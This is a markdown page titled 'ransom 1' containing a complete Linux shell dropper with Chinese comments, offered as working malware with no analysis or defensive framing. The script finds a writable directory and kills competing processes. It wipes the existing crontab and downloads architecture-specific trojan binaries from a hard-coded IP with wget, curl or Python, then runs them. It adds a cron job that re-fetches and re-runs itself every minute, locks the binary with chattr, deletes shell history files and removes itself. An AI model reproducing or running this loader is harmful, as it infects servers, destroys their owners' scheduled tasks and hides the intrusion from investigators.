# 勒索1
```
#!/bin/sh

# --- 1. 基础配置 ---
S="http://45.92.29.74"
N="kworker_ds"
# 自动寻找可写且可执行的目录，绕过 noexec 限制
DIRS="/tmp /var/run /dev/shm /mnt /root /var/tmp"
W="/tmp"
for d in $DIRS; do
    cd $d >/dev/null 2>&1 && touch .t >/dev/null 2>&1 && rm .t >/dev/null 2>&1 && W=$d && break
done
cd $W

# --- 2. 隐身模式：禁用当前会话的历史记录 ---
set +o history >/dev/null 2>&1
export HISTSIZE=0
export HISTFILESIZE=0

# --- 3. 暴力清场：杀掉临时目录运行的其他对手 ---
# 兼容 BusyBox 和标准 Linux 的 ps 格式
pids=$(ps | grep -E '/tmp|/var/run|/dev/shm' | grep -v grep | grep -v "1.sh" | grep -v "$N" | sed 's/^[ ]*//' | cut -d' ' -f1)
[ -n "$pids" ] && kill -9 $pids >/dev/null 2>&1

# --- 4. 清理原本的定时任务 (清空对手持久化) ---
if command -v crontab >/dev/null 2>&1; then
    echo "" | crontab - >/dev/null 2>&1
fi

# --- 5. 核心下载与执行函数 ---
try_run() {
    [ -z "$1" ] && return 1
    rm -f $N
    
    # 四重下载保障：wget -> curl -> python2 -> python3
    # 增加 --no-check-certificate 兼容老旧系统
    if wget -q --no-check-certificate $S/$1 -O $N || \
       curl -skL $S/$1 -o $N || \
       python -c "import urllib;urllib.urlretrieve('$S/$1', '$N')" >/dev/null 2>&1 || \
       python3 -c "import urllib.request;urllib.request.urlretrieve('$S/$1', '$N')" >/dev/null 2>&1; then
        
        if [ -s "$N" ]; then
            chmod 777 $N
            # 这里的 ./$N 后面可以加你的控制端参数（如果有的话）
            ./$N >/dev/null 2>&1 &
            sleep 2
            # 检查进程是否真的跑起来了
            if ps w | grep "$N" | grep -v grep >/dev/null 2>&1; then
                return 0 
            fi
        fi
    fi
    return 1
}

# --- 6. 智能架构检测 (最优匹配) ---
ARCH=$(uname -m)
BEST=""
case "$ARCH" in
    x86_64)          BEST="x86" ;;
    i386)            BEST="colomai486" ;;
    i486|i686)       BEST="colomai686" ;;
    aarch64|armv8*)  BEST="Colomaaarch64" ;;
    armv7*)          BEST="colomaarm7" ;;
    armv6*)          BEST="colomaarm6" ;;
    armv5*)          BEST="colomaarm5" ;;
    arm*)            BEST="colomaarm" ;;
    mips)            BEST="colomamips" ;;
    mipsel)          BEST="colomamipsel" ;;
    ppc*)            BEST="colomappc" ;;
    m68k)            BEST="colomam68k" ;;
esac

# 优先尝试最匹配的架构
SUCCESS=0
[ -n "$BEST" ] && try_run $BEST && SUCCESS=1

# --- 7. 兜底方案：全量遍历 (一个木马都不能少) ---
if [ $SUCCESS -eq 0 ]; then
    MS="Colomaaarch64 colomaarm colomaarm5 colomaarm6 colomaarm7 colomai486 colomai686 colomam68k colomamips colomamipsel colomappc x86"
    for m in $MS; do
        [ "$m" = "$BEST" ] && continue
        try_run $m && SUCCESS=1 && break
    done
fi

# --- 8. 持久化：隐蔽守活 (只追加，不破坏原系统) ---
if command -v crontab >/dev/null 2>&1; then
    # 每分钟检查，如果进程丢了，重新下载 1.sh 跑全流程
    (crontab -l 2>/dev/null | grep -v "$N" | grep -v "1.sh"; echo "* * * * * pgrep $N > /dev/null || (wget -q --no-check-certificate $S/1.sh -O $W/1.sh && sh $W/1.sh)") | crontab -
fi

# --- 9. 锁定与深度痕迹清理 ---
# 锁定二进制文件，防止被轻易删除
chattr +i $N >/dev/null 2>&1

# 彻底清理历史记录文件
FILES=".bash_history .zsh_history .sh_history .history"
for f in $FILES; do
    [ -f "$HOME/$f" ] && rm -f "$HOME/$f" >/dev/null 2>&1
    [ -f "/root/$f" ] && rm -f "/root/$f" >/dev/null 2>&1
done

# 清理内存缓冲区历史
history -c >/dev/null 2>&1
history -w >/dev/null 2>&1

# 脚本自销毁
rm -f "$0" >/dev/null 2>&1

```